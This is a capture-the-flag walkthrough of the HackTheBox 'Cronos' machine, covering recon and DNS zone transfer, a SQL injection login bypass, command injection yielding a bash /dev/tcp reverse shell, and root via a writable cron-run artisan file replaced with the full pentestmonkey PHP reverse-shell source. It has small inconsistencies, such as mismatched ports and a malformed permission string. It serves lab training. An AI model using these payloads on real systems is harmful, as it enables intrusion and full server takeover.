# Cronos HTB Write-up

## Machine Information
- **Name:** Cronos
- **Target IP:**  (anonymized)
- **Attack Machine IP:**  (anonymized)
- **Difficulty:** Medium
- **OS:** Ubuntu 16.04

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV 
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1
53/tcp open  domain  ISC BLIND 9.10.3-P4 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

**Key Observations:**
- Ubuntu 16.04 (end-of-life, potentially vulnerable)
- DNS server running (potential zone transfer)
- Apache web server with default page

---

## DSN Enumeration

### Finding the Domain

```bash
nolookup
> server 
> 
```

**Result:** `ns1.cronos.htb`

### Zone Transfer (AXFR)

```bash
dig axfr cronos.htb @
```

**Results:**
```
cronos.htb.        604800  IN  SOA cronos.htb. admin.cronos.htb. ...
cronos.htb.        604800  IN  NS  ns1.cronos.htb.
cronos.htb.        604800  IN  A   
admin.cronos.htb.  604800  IN  A   
ns1.cronos.htb.    604800  IN  A   
www.cronos.htb.    604800  IN  A   
```

**Discovered:** Subdomain `admin.cronos.htb`

### Update /etc/hosts

```bash
echo " cronos.htb admin.cronos.htb ns1.cronos.htb" >> /etc/hosts
```

---

## Web Enumeration

### Main Site (cronos.htb)

```bash
gobuster dir -u http://cronos.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Result:** Only default Apache page, no interesting directories.

### Admin Panel (admin.cronos.htb)

**Visit:** `http://admin.cronos.htb`

Found a login form.

---

## SQL Injection

### Manual Testing

The login form was vulnerable to SQL injection:

**Credentials:**
```
Username: -8893' OR 3054=3054-- cUlH
Password: anything
```

**Explanation:** 
- `-8893'` - Closes the username string
- `OR 3054=3054` - Always true condition
- `--` - Comments out the rest of the query

**Result:** Successfully bypassed authentication and logged in.

### SQLmap Payload Discovery

```bash
sqlmap -r req.txt -p username --batch --dbms=mysql
```

Sqlmap found the injection point and provided the working payload:
```
username=-8893' OR 3054=3054-- cUlH&password=
```

---

## Command Injection

### NetTool Panel

After logging in, I was presented with a "NetTool" panel containing ping and traceroute functionality.

**Test for command injection:**

```bash
127.0.0.1; id
```

**Result:** Command executed successfully, confirming command injection vulnerability.

### Reverse Shell

**On attacker machine:**
```bash
nc -lvnp 4444
```

**On NetTool panel:**
```27.0.0.1; bash -c "bash -i >& /dev/tcp//4444 0>&1"
```

**Result:** Reverse shell as `www-data` user.

---

## Shell as www-data

```bash
whoami
# www-data

id
# uid=33(www-data) gid=33(www-data)
```

---

## Privilege Escalation

### Enumerating Cron Jobs

```bash
cat /etc/crontab
```

**Output:**
```
* * * * * root php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

**Key Finding:** A cron job runs `/var/www/laravel/artisan` as **root** every minute.

### Checking File Permissions

```bash
ls -la /var/www/laravel/artisan
```

**Output:**
```
-rwx-xr-x-r 1 www-data www-data 1646 Apr 9 2017 /var/www/laravel/artisan
```

**Finding:** The file is owned by `www-data` (writable by our current user).

### Injecting Reverse Shell into artisan

```bash
www-data@cronos:/tmp$ cp /tmp/shell.php /var/www/laravel/artisan
cp /tmp/shell.php /var/www/laravel/artisan
```
then we can see what payload looks like:
```
cat /var/www/laravel/artisan
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```

### Waiting for Cron Execution

**On attacker machine:**
```bash
nc -lvnp 5555
```

**Result:** After ~1 minute, received a reverse shell as **root**!

---

## Root Shell

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
# [REDACTED]
```

### User Flag

```bash
cat /home/noulis/user.txt
# [REDACTED]
```

---

## Summary of Attack Path

| Step | Action |
|-----|--------|
 | 1 | Nmap scan identifies open ports (22, 53, 80) |
 | 2 | DNS zone transfer (`dig axfr`) reveals `admin.cronos.htb` |
 | 3 | SQL injection on login form bypasses authentication |
 | 4 | Command injection in NetTool provides `www-data` shell |
 | 5 | Cron job enumeration finds artisan running as root |
 | 6 | Artisan file writable by `www-data` allows injection |
 | 7 | Cron executes reverse shell as root |
 | 8 | Flags captured (`user.txt`, `root.txt`) |

---
